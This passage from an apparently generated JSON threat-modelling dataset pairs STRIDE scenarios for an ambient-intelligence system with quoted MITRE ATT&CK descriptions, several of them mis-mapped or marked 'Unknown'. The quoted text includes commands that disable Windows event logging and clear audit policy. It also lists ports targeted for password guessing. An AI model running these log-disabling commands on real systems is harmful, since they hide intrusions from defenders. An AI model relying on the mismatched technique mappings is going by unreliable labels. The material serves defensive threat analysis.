            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges by exploiting unpatched vulnerabilities in the system\u2019s software to gain administrator access.",
            "Assumptions": [
                {
                    "Assumption": "Existence of unpatched vulnerabilities.",
                    "Role": "Software Developer",
                    "Condition": "Delay or failure in patch management."
                },
                {
                    "Assumption": "Lack of security audits and vulnerability assessments.",
                    "Role": "IT Security",
                    "Condition": "No regular system audits."
                }
            ],
            "Potential Impact": "Unauthorized administrative access leading to full control of the system and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "administrator access",
                "system control"
            ],
            "mitre_technique": {
                "name": "Component Object Model",
                "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",
                "id": "attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64",
                "technique_id": "T1559.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains higher privileges by exploiting misconfigured access control settings in cloud-based data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Misconfiguration in cloud access management.",
                    "Role": "Cloud Administrator",
                    "Condition": "Permissions granted incorrectly."
                },
                {
                    "Assumption": "Absence of principle of least privilege.",
                    "Role": "IT Manager",
                    "Condition": "Users have excessive permissions."
                }
            ],
            "Potential Impact": "Increased privilege access leading to potential data corruption or unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "access control",
                "cloud repository",
                "privilege escalation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to trick an authorized user into revealing admin credentials, gaining elevated access.",
            "Assumptions": [
                {
                    "Assumption": "Lack of user training on social engineering threats.",
                    "Role": "Security Trainer",
                    "Condition": "Users unprepared for phishing attacks."
                },
                {
                    "Assumption": "No multi-factor authentication in use.",
                    "Role": "System Administrator",
                    "Condition": "Single factor authentication allows credential theft."
                }
            ],
            "Potential Impact": "Unauthorized elevation of privileges leading to full system control and potential compromise of all data.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "credential theft",
                "phishing",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "18",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof sensor data to make the Ambient Intelligence system believe that environmental conditions have changed.",
            "Assumptions": [
                {
                    "Assumption": "The system relies on sensor data to make decisions.",
                    "Role": "System Architect",
                    "Condition": "Sensor data is not verified through secure channels."
                },
                {
                    "Assumption": "The attacker has physical or network access to a sensor.",
                    "Role": "Security Professional",
                    "Condition": "Sensors do not have robust tamper detection mechanisms."
                },
                {
                    "Assumption": "There is no encryption or weak encryption on sensor data transmission.",
                    "Role": "Cryptographer",
                    "Condition": "Data is transmitted in plaintext or easily breakable encryption schemes."
                }
            ],
            "Potential Impact": "Can lead to unauthorized environmental changes, compromising physical security.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "sensor",
                "network",
                "data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a user by stealing or guessing their password, PIN, or biometric data.",
            "Assumptions": [
                {
                    "Assumption": "Users often choose weak passwords or PINs.",
                    "Role": "User",
                    "Condition": "Weak password policies are in place."
                },
                {
                    "Assumption": "Biometric data is not securely stored or transmitted.",
                    "Role": "System Architect",
                    "Condition": "Biometric data storage lacks strong encryption."
                },
                {
                    "Assumption": "The attacker has access to or can capture biometric data.",
                    "Role": "Security Analyst",
                    "Condition": "There are vulnerabilities in the biometric data capture process."
                }
            ],
            "Potential Impact": "Access to sensitive user data and control over the system.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "user",
                "password",
                "biometric"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could use fake smart cards or hardware tokens to gain unauthorized access to the system.",
            "Assumptions": [
                {
                    "Assumption": "Smart card or hardware token validation mechanisms are weak.",
                    "Role": "System Administrator",
                    "Condition": "Validation does not use strong cryptographic techniques."
                },
                {
                    "Assumption": "The attacker has physical access to the smart card or hardware token.",
                    "Role": "Security Professional",
                    "Condition": "Tokens are not kept secure."
                },
                {
                    "Assumption": "There is inadequate monitoring of authentication attempts.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of real-time monitoring."
                }
            ],
            "Potential Impact": "Unauthorized access to user-sensitive data and system configurations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "authentication",
                "smart card",
                "token"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--6f83bba1-b33d-47ae-bda8-42e896810d09",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with sensor hardware to provide false readings.",
            "Assumptions": [
                {
                    "Assumption": "Sensors are physically accessible in unsecured locations.",
                    "Role": "Facility Manager",
                    "Condition": "Lack of physical security measures."
                },
                {
                    "Assumption": "The tampered sensor data is not validated before being used by the AmI system.",
                    "Role": "Software Developer",
                    "Condition": "Lack of data integrity checks."
                },
                {
                    "Assumption": "The attacker has tools to manipulate or replace sensor hardware.",
                    "Role": "Malicious Actor",
                    "Condition": "Lack of hardware tamper detection."
                }
            ],
            "Potential Impact": "Could lead to incorrect system decisions impacting user safety and comfort.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "sensor",
                "hardware",
                "device"
            ],
            "mitre_technique": {
                "name": "Hardware",
                "description": "Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",
                "id": "attack-pattern--24286c33-d4a4-4419-85c2-1d094a896c26",
                "technique_id": "T1592.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify the stored data in data repositories to manipulate system behavior.",
            "Assumptions": [
                {
                    "Assumption": "Data repositories are not protected by strong access controls.",
                    "Role": "Database Administrator",
                    "Condition": "Weak access control policies."
                },
                {
                    "Assumption": "Data integrity is not checked, allowing modified data to be used.",
                    "Role": "Software Developer",
                    "Condition": "No data validation checks."
                },
                {
                    "Assumption": "The attacker has access to database credentials or exploits vulnerabilities.",
                    "Role": "Malicious Actor",
                    "Condition": "Database vulnerabilities exist."
                }
            ],
            "Potential Impact": "Compromise of system decision-making and personalized user services.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database",
                "data",
                "repository"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could insert malicious code into the AI/ML models to alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "The AI/ML models are not integrity-checked at runtime.",
                    "Role": "AI Engineer",
                    "Condition": "Lack of runtime integrity checks."
                },
                {
                    "Assumption": "Model training data and model files are not securely stored.",
                    "Role": "Data Scientist",
                    "Condition": "Weak storage security policies."
                },
                {
                    "Assumption": "The attacker has access to the machine learning pipeline.",
                    "Role": "Malicious Actor",
                    "Condition": "Pipeline vulnerabilities exist."
                }
            ],
            "Potential Impact": "Corrupt learning processes and compromised decision-making.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "model",
                "ai",
                "ml"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user could deny having performed an action in the system, such as unlocking a door.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log user actions with sufficient detail.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging and auditing policies."
                },
                {
                    "Assumption": "There is no secure timestamping mechanism to verify actions.",
                    "Role": "Software Developer",
                    "Condition": "Lack of or weak timestamping."
                },
                {
                    "Assumption": "Log data is not protected against tampering.",
                    "Role": "Security Professional",
                    "Condition": "Log integrity is not enforced."
                }
            ],
            "Potential Impact": "Erodes trust in the system and complicates incident response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "user action",
                "audit"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could manipulate logs to cover their malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Audit logs are not write-protected and securely stored.",
                    "Role": "Security Analyst",
                    "Condition": "Weak log storage security."
                },
                {
                    "Assumption": "Logs are not regularly reviewed or monitored in real-time.",
                    "Role": "System Administrator",
                    "Condition": "Lack of log review policies."
                },
                {
                    "Assumption": "The attacker has access to the logging system.",
                    "Role": "Malicious Actor",
                    "Condition": "Logging system vulnerabilities exist."
                }
            ],
            "Potential Impact": "Failure to detect and respond to malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "audit",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user could claim that an automated system action (e.g., temperature adjustment) was not authorized by them.",
            "Assumptions": [
                {
                    "Assumption": "User actions and system-triggered events are not distinguishable in logs.",
                    "Role": "System Architect",
                    "Condition": "Logs do not differentiate user and system actions."
                },
                {
                    "Assumption": "There is no user confirmation step for critical actions.",
                    "Role": "UX Designer",
                    "Condition": "Lack of user confirmation mechanisms."
                },
                {
                    "Assumption": "Logs are not securely timestamped and tamper-proof.",
                    "Role": "Security Analyst",
                    "Condition": "Weak log integrity."
                }
            ],
            "Potential Impact": "Disputes over system actions and decreased user confidence.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "system action",
                "user dispute",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data collected by sensors could be intercepted during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Use of plaintext communication."
                },
                {
                    "Assumption": "The wireless network lacks adequate security measures.",
                    "Role": "Network Engineer",
                    "Condition": "Weak or no encryption on wireless networks."
                },
                {
                    "Assumption": "The attacker has the capability to intercept network traffic.",
                    "Role": "Malicious Actor",
                    "Condition": "Access to network infrastructure."
                }
            ],
            "Potential Impact": "Unauthorized access to user data, compromising user privacy.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "interception",
                "network traffic",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthorized user could access stored data in cloud repositories.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage access controls are weak.",
                    "Role": "Cloud Administrator",
                    "Condition": "Weak access control policies in cloud services."
                },
                {
                    "Assumption": "Data in the cloud storage is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "No encryption for data at rest."
                },
                {
                    "Assumption": "The attacker has credentials or exploits cloud storage vulnerabilities.",
                    "Role": "Malicious Actor",
                    "Condition": "Cloud storage systems have security vulnerabilities."
                }
            ],
            "Potential Impact": "Compromise of sensitive data and user privacy.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "unauthorized access",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Internal users with access to the AI/ML models could extract sensitive training data.",
            "Assumptions": [
                {
                    "Assumption": "Access to AI/ML model training data is not restricted.",
                    "Role": "Data Scientist",
                    "Condition": "Lack of role-based access controls."
                },
                {
                    "Assumption": "Training data is stored without encryption.",
                    "Role": "Data Engineer",
                    "Condition": "Weak data storage security."
                },
                {
                    "Assumption": "There is no monitoring of access to training data.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of data access logs and monitoring."
                }
            ],
            "Potential Impact": "Leakage of sensitive data used in AI model training.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "ai",
                "ml",
                "training data"
            ],
            "mitre_technique": {
                "name": "Gather Victim Host Information",
                "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "id": "attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f",
                "technique_id": "T1592"
            }
        },
        {
            "Threat Type": "Denial of Service",
